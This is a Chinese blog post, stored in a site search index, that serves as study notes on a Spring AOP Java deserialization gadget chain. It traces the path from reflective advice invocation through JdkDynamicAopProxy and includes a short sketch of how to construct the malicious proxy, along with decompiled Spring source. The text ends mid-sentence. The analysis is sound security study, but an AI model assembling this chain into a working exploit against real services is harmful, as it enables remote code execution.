<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>spring aop漏洞学习笔记(污染链分析&amp;项目源码分析)</title>
      <link href="/2025/03/09/spring%20aop%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E6%B1%A1%E6%9F%93%E8%BF%9E%E5%88%86%E6%9E%90&amp;%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90)/"/>
      <url>/2025/03/09/spring%20aop%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E6%B1%A1%E6%9F%93%E8%BF%9E%E5%88%86%E6%9E%90&amp;%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>笔者:han</p><p>qq:1512624649</p><p>博客:<a href="http://hanblog.top(有的时候会挂掉懒得重新起)/">http://hanblog.top(有的时候会挂掉懒得重新起)</a></p><p>请开代理访问。图床在github。不然加载不出来(</p><p>本笔记项目地址：<a href="https://github.com/Ape1ron/SpringAopInDeserializationDemo1">https://github.com/Ape1ron/SpringAopInDeserializationDemo1</a></p><p>此笔记在原作者文章的分析基础上加上一些笔记和理解。以及对项目源代码的一次详细分析(笔者没写的地方做补充)更好看懂。</p><p>若有错误欢迎大佬指出</p><h2 id="前置知识需要-动态代理-代理-拦截器-切面-单例对象-通知等等（按自己需要决定是否跳过）"><a href="#前置知识需要-动态代理-代理-拦截器-切面-单例对象-通知等等（按自己需要决定是否跳过）" class="headerlink" title="前置知识需要:动态代理 代理 拦截器 切面 单例对象 通知等等（按自己需要决定是否跳过）"></a>前置知识需要:动态代理 代理 拦截器 切面 单例对象 通知等等（按自己需要决定是否跳过）</h2><p>以下是这些概念和组件的详细解析及其关系图：</p><h3 id="核心概念与关系总览"><a href="#核心概念与关系总览" class="headerlink" title="核心概念与关系总览"></a><strong>核心概念与关系总览</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[动态代理] --&gt; B[JDK动态代理]</span><br><span class="line">    A --&gt; C[CGLIB动态代理]</span><br><span class="line">    B --&gt; D[InvocationHandler]</span><br><span class="line">    C --&gt; E[MethodInterceptor]</span><br><span class="line">    D --&gt; F[拦截器逻辑]</span><br><span class="line">    E --&gt; F[拦截器逻辑]</span><br><span class="line">    F --&gt; G[Advice]</span><br><span class="line">    G --&gt; H[通知类型]</span><br><span class="line">    H --&gt; H1[@Before]</span><br><span class="line">    H --&gt; H2[@After]</span><br><span class="line">    H --&gt; H3[@Around]</span><br><span class="line">    G --&gt; I[Advisor]</span><br><span class="line">    I --&gt; J[Pointcut]</span><br><span class="line">    I --&gt; K[Advice]</span><br><span class="line">    J --&gt; L[AspectJExpressionPointcut]</span><br><span class="line">    K --&gt; M[AspectJAroundAdvice]</span><br><span class="line">    I --&gt; N[DefaultIntroductionAdvisor]</span><br><span class="line">    O[AdvisedSupport] --&gt; P[配置中心]</span><br><span class="line">    P --&gt; Q[目标对象]</span><br><span class="line">    P --&gt; R[拦截器链]</span><br><span class="line">    P --&gt; S[代理接口]</span><br><span class="line">    R --&gt; T[DefaultAdvisorChainFactory]</span><br><span class="line">    U[SingletonAspectInstanceFactory] --&gt; V[切面单例管理]</span><br></pre></td></tr></table></figure><h3 id="1-基础概念层"><a href="#1-基础概念层" class="headerlink" title="1. 基础概念层"></a><strong>1. 基础概念层</strong></h3><h4 id="1-代理-Proxy"><a href="#1-代理-Proxy" class="headerlink" title="(1) 代理 (Proxy)"></a><strong>(1) 代理 (Proxy)</strong></h4><ul><li><strong>定义</strong>：一种设计模式，通过中间对象控制对原始对象的访问。</li><li><strong>作用</strong>：实现权限控制、延迟加载、日志记录等<strong>横切关注点</strong>。</li><li><strong>类型</strong>：<ul><li><strong>静态代理</strong>：手动编写代理类（编译时确定）</li><li><strong>动态代理</strong>：运行时动态生成代理类</li></ul></li></ul><h4 id="2-动态代理-Dynamic-Proxy"><a href="#2-动态代理-Dynamic-Proxy" class="headerlink" title="(2) 动态代理 (Dynamic Proxy)"></a><strong>(2) 动态代理 (Dynamic Proxy)</strong></h4><ul><li><strong>实现方式</strong>：<ul><li><strong>JDK动态代理</strong>：基于接口（要求目标对象实现接口）</li><li><strong>CGLIB****动态代理</strong>：基于继承（可代理无接口的类）</li></ul></li><li><strong>核心接口</strong>：<ul><li><code>InvocationHandler</code>（JDK代理）</li><li><code>MethodInterceptor</code>（CGLIB代理）</li></ul></li></ul><h4 id="3-拦截器-Interceptor"><a href="#3-拦截器-Interceptor" class="headerlink" title="(3) 拦截器 (Interceptor)"></a><strong>(3) 拦截器 (Interceptor)</strong></h4><ul><li><strong>本质</strong>：实现方法调用拦截的组件</li><li><strong>典型实现</strong>：<ul><li><code>MethodInterceptor</code>（Spring AOP）</li><li><code>HandlerInterceptor</code>（Spring MVC）</li></ul></li></ul><h4 id="4-单例对象-Singleton"><a href="#4-单例对象-Singleton" class="headerlink" title="(4) 单例对象 (Singleton)"></a><strong>(4) 单例对象 (Singleton)</strong></h4><ul><li><strong>定义</strong>：在整个应用中只有一个实例的对象</li><li><strong>Spring默认作用域</strong>：Bean默认单例</li><li><strong>与代理的关系</strong>：代理对象本身通常是单例的</li></ul><h3 id="2-AOP核心层"><a href="#2-AOP核心层" class="headerlink" title="2. AOP核心层"></a><strong>2. AOP核心层</strong></h3><h4 id="1-切面-Aspect"><a href="#1-切面-Aspect" class="headerlink" title="(1) 切面 (Aspect)"></a><strong>(1) 切面 (Aspect)</strong></h4><ul><li><strong>定义</strong>：模块化的横切关注点（如日志、事务）</li><li><strong>组成</strong> &#x3D; <strong>通知 (Advice)</strong> + <strong>切点 (Pointcut)</strong></li></ul><h4 id="2-通知-Advice"><a href="#2-通知-Advice" class="headerlink" title="(2) 通知 (Advice)"></a><strong>(2) 通知 (Advice)</strong></h4><ul><li><strong>类型</strong>：<ul><li><code>@Before</code>：方法执行前</li><li><code>@AfterReturning</code>：方法正常返回后</li><li><code>@AfterThrowing</code>：方法抛出异常后</li><li><code>@After</code>：方法最终执行（类似finally）</li><li><code>@Around</code>：完全控制方法执行（最强大）</li></ul></li></ul><p>通知里还有自定义逻辑这段代码就是切面要执行的代码，它决定了当目标方法被拦截时，实际要做什么。</p><h4 id="3-切点-Pointcut"><a href="#3-切点-Pointcut" class="headerlink" title="(3) 切点 (Pointcut)"></a><strong>(3) 切点 (Pointcut)</strong></h4><ul><li><strong>定义</strong>：通过表达式定义需要拦截的方法</li><li><strong>实现类</strong>：<ul><li><code>AspectJExpressionPointcut</code>（基于AspectJ语法）</li></ul></li></ul><h3 id="3-Spring-AOP实现层"><a href="#3-Spring-AOP实现层" class="headerlink" title="3. Spring AOP实现层"></a><strong>3. Spring AOP实现层</strong></h3><h4 id="1-AdvisedSupport"><a href="#1-AdvisedSupport" class="headerlink" title="(1) AdvisedSupport"></a><strong>(1) AdvisedSupport</strong></h4><ul><li><strong>角色</strong>：AOP配置中心</li><li><strong>存储内容</strong>：<ul><li>目标对象（Target）</li><li>拦截器链（Advisors）</li><li>代理接口（Interfaces）</li><li>配置标志（如exposeProxy）</li></ul></li></ul><h4 id="2-Advisor"><a href="#2-Advisor" class="headerlink" title="(2) Advisor"></a><strong>(2) Advisor</strong></h4><ul><li><strong>定义</strong>：Advice的包装器，关联Advice和Pointcut</li><li><strong>类型</strong>：<ul><li><code>PointcutAdvisor</code>：通用类型</li><li><code>IntroductionAdvisor</code>：用于动态添加接口</li><li><code>DefaultIntroductionAdvisor</code>：实现类</li></ul></li></ul><h4 id="3-DefaultAdvisorChainFactory"><a href="#3-DefaultAdvisorChainFactory" class="headerlink" title="(3) DefaultAdvisorChainFactory"></a><strong>(3) DefaultAdvisorChainFactory</strong></h4><ul><li><p><strong>作用</strong>：根据AdvisedSupport生成拦截器调用链</p></li><li><p><strong>核心方法</strong>：</p><ul><li><pre><code class="language-Java">List&lt;MethodInterceptor&gt; getInterceptors(Advised config, Method method, Class&lt;?&gt; targetClass)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### **(4) SingletonAspectInstanceFactory**</span><br><span class="line"></span><br><span class="line">- **作用**：确保切面实例是单例的</span><br><span class="line">- **使用场景**：管理`@Aspect`注解的类实例</span><br><span class="line"></span><br><span class="line">### **4. 关键类详解**</span><br><span class="line"></span><br><span class="line">#### **(1) MethodInterceptor**</span><br><span class="line"></span><br><span class="line">```Java</span><br><span class="line">public interface MethodInterceptor extends Interceptor &#123;</span><br><span class="line">    Object invoke(MethodInvocation invocation) throws Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p><strong>使用场景</strong>：CGLIB代理的拦截逻辑实现</p></li><li><p><strong>与InvocationHandler的区别</strong>：</p><ul><li><code>InvocationHandler</code>：JDK代理专用</li><li><code>MethodInterceptor</code>：更灵活，支持嵌套调用</li></ul></li></ul><h4 id="2-AspectJAroundAdvice"><a href="#2-AspectJAroundAdvice" class="headerlink" title="(2) AspectJAroundAdvice"></a><strong>(2) AspectJAroundAdvice</strong></h4><ul><li><strong>作用</strong>：实现<code>@Around</code>通知的底层类</li><li><strong>协作组件</strong>：<ul><li><code>MethodInvocationProceedingJoinPoint</code>：封装目标方法调用</li><li><code>AspectJExpressionPointcut</code>：定义拦截范围</li></ul></li></ul><h4 id="3-DefaultIntroductionAdvisor"><a href="#3-DefaultIntroductionAdvisor" class="headerlink" title="(3) DefaultIntroductionAdvisor"></a><strong>(3) DefaultIntroductionAdvisor</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultIntroductionAdvisor</span> <span class="keyword">implements</span> <span class="title class_">IntroductionAdvisor</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Advice advice;</span><br><span class="line">    <span class="keyword">private</span> Class&lt;?&gt; interfaceType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>特殊用途</strong>：动态为对象添加新接口</li><li><strong>漏洞利用场景</strong>：让字符串对象伪装成<code>Map</code>接口实现</li></ul><h3 id="5-完整协作流程"><a href="#5-完整协作流程" class="headerlink" title="5. 完整协作流程"></a><strong>5. 完整协作流程</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant Client</span><br><span class="line">    participant Proxy</span><br><span class="line">    participant AdvisedSupport</span><br><span class="line">    participant AdvisorChainFactory</span><br><span class="line">    participant MethodInterceptor</span><br><span class="line"></span><br><span class="line">    Client-&gt;&gt;Proxy: 调用方法()</span><br><span class="line">    Proxy-&gt;&gt;AdvisedSupport: 获取配置</span><br><span class="line">    AdvisedSupport-&gt;&gt;AdvisorChainFactory: 生成拦截器链</span><br><span class="line">    AdvisorChainFactory-&gt;&gt;AdvisedSupport: 返回MethodInterceptor列表</span><br><span class="line">    loop 拦截器链执行</span><br><span class="line">        Proxy-&gt;&gt;MethodInterceptor: invoke()</span><br><span class="line">        MethodInterceptor-&gt;&gt;目标方法: 执行前后逻辑</span><br><span class="line">    end</span><br><span class="line">    Proxy--&gt;&gt;Client: 返回结果</span><br></pre></td></tr></table></figure><h3 id="6-漏洞利用中的典型组合"><a href="#6-漏洞利用中的典型组合" class="headerlink" title="6. 漏洞利用中的典型组合"></a><strong>6. 漏洞利用中的典型组合</strong></h3><h4 id="1-构造恶意代理链"><a href="#1-构造恶意代理链" class="headerlink" title="(1) 构造恶意代理链"></a><strong>(1) 构造恶意代理链</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建AdvisedSupport并注入恶意配置</span></span><br><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">advisedSupport.setTarget(<span class="string">&quot;任意对象&quot;</span>);</span><br><span class="line"><span class="comment">// 通过反射绕过安全检查</span></span><br><span class="line">Reflections.setFieldValue(advisedSupport, <span class="string">&quot;advisors&quot;</span>, maliciousAdvisors);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成代理对象</span></span><br><span class="line"><span class="type">AopProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdkDynamicAopProxy</span>(advisedSupport);</span><br><span class="line"><span class="type">Map</span> <span class="variable">evilMap</span> <span class="operator">=</span> (Map) proxy.getProxy();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发攻击（如反序列化时调用toString）</span></span><br><span class="line">evilMap.toString(); <span class="comment">// 执行恶意代码</span></span><br></pre></td></tr></table></figure><h4 id="2-关键组件的作用"><a href="#2-关键组件的作用" class="headerlink" title="(2) 关键组件的作用"></a><strong>(2) 关键组件的作用</strong></h4><table><thead><tr><th>组件</th><th>攻击中的作用</th></tr></thead><tbody><tr><td><code>DefaultIntroductionAdvisor</code></td><td>让代理对象实现危险接口（如<code>Map</code>）</td></tr><tr><td><code>AspectJAroundAdvice</code></td><td>嵌入恶意代码（如命令执行）</td></tr><tr><td><code>AdvisedSupport</code></td><td>集中管理攻击配置</td></tr><tr><td><code>MethodInterceptor</code></td><td>实际执行攻击逻辑的拦截器</td></tr></tbody></table><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li><strong>动态代理</strong>是实现AOP的底层技术</li><li><strong>AdvisedSupport</strong>是Spring AOP的配置枢纽</li><li><strong>Advisor</strong>将拦截逻辑（Advice）与触发条件（Pointcut）绑定</li><li><strong>MethodInterceptor</strong>和<strong>InvocationHandler</strong>是不同代理实现的拦截核心</li><li>理解这些组件的关系是分析Spring漏洞（如内存马注入）的关键基础</li></ul><h2 id="污染链顺序分析："><a href="#污染链顺序分析：" class="headerlink" title="污染链顺序分析："></a>污染链顺序分析：</h2><h3 id="寻找污染点："><a href="#寻找污染点：" class="headerlink" title="寻找污染点："></a>寻找污染点：</h3><p>污染点的作用：通过反射调用函数。</p><p>后续再通过寻找各种利用链触发污染点。然后用反射调用其他方法</p><p>org.springframework.aop.aspectj.AbstractAspectJAdvice</p><p>在这个类下invokeAdviceMethodWithGivenArgs存在反射调用</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>又从readobject这个类里发现这个aspectjadvicemethod字段会被重新赋值</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250309181018520.png" alt="image-20250309181018520"></p><p>aspectjadvicemethod这是一个属性。这个属性指向的是这个拦截器会调用的函数</p><p>再来简单了解一下invoke。invoke的常见写法是这样的method.invoke(object,args)</p><p>method是需要操作的类的方法。通过反射获取。</p><p>object是这个类的实例对象。</p><p>args是这个方法的传递参数。</p><p>由此我们可以发现method和args都是可控的。一个通过readobject一个是invokeAdviceMethodWithGivenArgs(args)传递的。</p><p>object是一个对象。这个对象需要有getAspectInstance()这个函数。并且他需要序列化和反序列化。所以由此可以知道他需要实现一个aspectInstanceFactory和Serializable接口的对象</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>我们发现这里有九个继承这个接口的类。找一下发现</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这个类SingletonAspectInstanceFactory是符合要求的。所以只需要传入一个这个的对象就可以实现反射调用</p><h3 id="寻找利用链"><a href="#寻找利用链" class="headerlink" title="寻找利用链"></a>寻找利用链</h3><p>需要注意的是<code>invokeAdviceMethodWithGivenArgs</code> 是 Spring AOP 内部调用的</p><p>所以在项目的完整poc里是找不到<code>invokeAdviceMethodWithGivenArgs</code> 这个的。我们需要通过一系列利用链去触发这里</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这里又两个相似的invokeAdviceMethod。追下面还是上面都一样的。这里就用下面的</p><p>我们可以发现追溯一下</p><p>利用链这里也就变成了</p><p>AspectAroundAdvice#invoke-&gt;invokeAdviceMethod-&gt;invokeAdviceMethodWithGivenArgs</p><p>在项目里的poc也是通过AspectAroundAdvice去触发的</p><p>再往上追溯</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>有四个可以运用了这里的invoke</p><p>这三个分别的作用如下</p><p>ReflectiveMethodInvocation 是 <strong>Spring</strong> <strong>AOP</strong> <strong>的核心类</strong>，用于 *<em>管理并执行</em><em><strong>拦截器</strong></em>*链（**<strong>Interceptor</strong> <strong>Chain）</strong>。</p><p><strong>当代理对象的方法被调用时，Spring</strong> <strong>AOP</strong> <strong>通过这个类依次执行**<strong>拦截器</strong></strong>，最终调用目标方法。**</p><p>DebugInterceptor<strong>是一个**<strong>拦截器</strong></strong>（<strong><strong>Interceptor</strong></strong>），用于** <strong>AOP</strong> <strong>调试</strong>。<strong>它会拦截方法调用，并在方法执行前后打印日志信息</strong>，帮助开发者分析 AOP 执行过程。</p><p><strong><code>ExposeBeanNameAdvisors</code></strong> <strong>主要用于 Spring</strong> <strong>AOP</strong> <strong>代理，让代理对象能够知道自己的 Bean 名称。</strong></p><p><strong>在<strong><strong>拦截器</strong></strong>链中获取当前 Bean 的名称。</strong></p><p><strong>支持</strong> <strong><code>@ExposeProxy</code></strong> <strong>功能，使方法调用时可以获取代理对象本身。</strong></p><p>三个到底通过谁触发呢</p><p>我们先看DebugInterceptor</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这里是no usages没有使用的。无法通过别的东西触发。而且自身也没有Serializable去支持这个类序列化。所以不符合要求。</p><p>这里需要再次明确一下我们的要求。通过一个有继承Serializable这个接口的类去调用。所以上面这个不符合条件</p><p>再看这个ExposeBeanNameIntroduction</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>有一个usage</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>但是在往上追就会发现又是no usages。并且这个类也是没有Serializable的</p><p>所以最后看看ReflectiveMethodInvocation他也不是继承Serializable接口的</p><p>但我们发现这个有多处的usages。并且这里的JdkDynamicAopProxy是存在Serializable接口的</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>我们发现当我们通过JdkDynamicAopProxy创建的代理对象的时候。如果这个时候还有一个拦截器链。那么就会先执行拦截器链再执行目标对象的函数。而在这个时候就会触发ReflectiveMethodInvocation的代码。如下</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>最后通过BadAttributeValueExpException去触发这个代理对象。这个触发会在下面的项目源代码分析里提及。这里不重复叙述了</p><p>明确完了整条利用链了。我们看一下完整利用链的图然后分析参数</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><h3 id="分析参数"><a href="#分析参数" class="headerlink" title="分析参数"></a>分析参数</h3><p>我们再分析一下这里所需的参数</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这里的参数分析直接用项目作者的话(偷个懒。感觉自己讲和他讲的其实差不多。作者的可能更好)</p><p>第一个点是<code>interceptorOrInterceptionAdvice</code>的获取，是从<code>interceptorsAndDynamicMethodMatchers</code>中拿到的，该属性本身定义就是一个List，可以序列化，而索引currentInterceptorIndex本身也只是int类型。因此可以认为<code>interceptorOrInterceptionAdvice</code>是可控的。</p><p>第二个点是<code>interceptorOrInterceptionAdvice</code>的类型，按照笔者上面的调用链，这个对象的类型是<code>org.springframework.aop.aspectj.AspectJAroundAdvice</code>（<code>AbstractAspectJAdvice</code>的子类），那么<code>proceed</code>代码是走下面的分支，省去了一部分麻烦：）</p><p>最后就差JdkDynamicAopProxy这个类里的参数分析了。开始吧：</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>我们需要满足if条件才能触发ReflectiveMethodInvocation</p><p>所以需要看这个函数了getInterceptorsAndDynamicInterceptionAdvice</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>这里的cached有两种赋值方式：</p><ol><li>从缓存的methodCache中获取</li><li>通过getInterceptorsAndDynamicInterceptionAdvice方法</li></ol><p>methodCache属性，本身加了<code>transient</code>修饰符导致这个字段不能被序列化。我们是无法通过反序列化控制的，并且在<code>readObject</code>方法中是直接新建的赋值的，判断这条路是不可行的。</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>所以分析getInterceptorsAndDynamicInterceptionAdvice这个函数</p><p><img src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/asynccode" alt="img"></p><p>发现这个有个继承。又因为他是一个接口。所以上面这段代码cached &#x3D; this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass);我们运行的就是这个继承下的getInterceptorsAndDynamicInterceptionAdvice。</p><p>代码段如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* loaded from: spring-aop-5.3.19.jar:org/springframework/aop/framework/DefaultAdvisorChainFactory.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultAdvisorChainFactory</span> <span class="keyword">implements</span> <span class="title class_">AdvisorChainFactory</span>, Serializable &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// org.springframework.aop.framework.AdvisorChainFactory</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Object&gt; <span class="title function_">getInterceptorsAndDynamicInterceptionAdvice</span><span class="params">(Advised config, Method method, <span class="meta">@Nullable</span> Class&lt;?&gt; targetClass)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> match;</span><br><span class="line">        <span class="type">AdvisorAdapterRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> GlobalAdvisorAdapterRegistry.getInstance();</span><br><span class="line">        Advisor[] advisors = config.getAdvisors();</span><br><span class="line">        List&lt;Object&gt; interceptorList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(advisors.length);</span><br><span class="line">        Class&lt;?&gt; actualClass = targetClass != <span class="literal">null</span> ? targetClass : method.getDeclaringClass();</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">hasIntroductions</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Advisor advisor : advisors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (advisor <span class="keyword">instanceof</span> PointcutAdvisor) &#123;</span><br><span class="line">                <span class="type">PointcutAdvisor</span> <span class="variable">pointcutAdvisor</span> <span class="operator">=</span> (PointcutAdvisor) advisor;</span><br><span class="line">                <span class="keyword">if</span> (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) &#123;</span><br><span class="line">                    <span class="type">MethodMatcher</span> <span class="variable">mm</span> <span class="operator">=</span> pointcutAdvisor.getPointcut().getMethodMatcher();</span><br><span class="line">                    <span class="keyword">if</span> (mm <span class="keyword">instanceof</span> IntroductionAwareMethodMatcher) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hasIntroductions == <span class="literal">null</span>) &#123;</span><br><span class="line">                            hasIntroductions = Boolean.valueOf(hasMatchingIntroductions(advisors, actualClass));</span><br><span class="line">                        &#125;</span><br><span class="line">                        match = ((IntroductionAwareMethodMatcher) mm).matches(method, actualClass, hasIntroductions.booleanValue());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        match = mm.matches(method, actualClass);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (match) &#123;</span><br><span class="line">                        MethodInterceptor[] interceptors = registry.getInterceptors(advisor);</span><br><span class="line">                        <span class="keyword">if</span> (mm.isRuntime()) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (MethodInterceptor interceptor : interceptors) &#123;</span><br><span class="line">                                interceptorList.add(<span class="keyword">new</span> <span class="title class_">InterceptorAndDynamicMethodMatcher</span>(interceptor, mm));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            interceptorList.addAll(Arrays.asList(interceptors));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (advisor <span class="keyword">instanceof</span> IntroductionAdvisor) &#123;</span><br><span class="line">                <span class="type">IntroductionAdvisor</span> <span class="variable">ia</span> <span class="operator">=</span> (IntroductionAdvisor) advisor;</span><br><span class="line">                <span class="keyword">if</span> (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) &#123;</span><br><span class="line">                    Interceptor[] interceptors2 = registry.getInterceptors(advisor);</span><br><span class="line">                    interceptorList.addAll(Arrays.asList(interceptors2));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Interceptor[] interceptors3 = registry.getInterceptors(advisor);</span><br><span class="line">                interceptorList.addAll(Arrays.asList(interceptors3));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> interceptorList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasMatchingIntroductions</span><span class="params">(Advisor[] advisors, Class&lt;?&gt; actualClass)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Advisor advisor : advisors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (advisor <span class="keyword">instanceof</span> IntroductionAdvisor) &#123;</span><br><span class="line">                <span class="type">IntroductionAdvisor</span> <span class="variable">ia</span> <span class="operator">=</span> (IntroductionAdvisor) advisor;</span><br><span class="line">                <span class="keyword">if</span> (ia.getClassFilter().matches(actualClass)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是 Spring AOP 中用于构建方法拦截器链的核心逻辑，来自 <code>DefaultAdvisorChainFactory</code> 类的 